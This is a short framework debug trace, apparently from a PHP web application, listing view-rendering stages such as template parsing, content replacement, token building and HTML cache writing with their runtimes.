+INFO: ParseTemplate Behavior ::run [ RunTime:0.012883s ]
+INFO: [ view_parse ] --END-- [ RunTime:-0.047605s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.000188s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.000075s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.000016s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.000117s ]
+INFO: [ view_filter ] --END-- [ RunTime:-0.053660s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.000057s ]
+INFO: [ view_end ] --END-- [ RunTime:-0.051533s ]
+
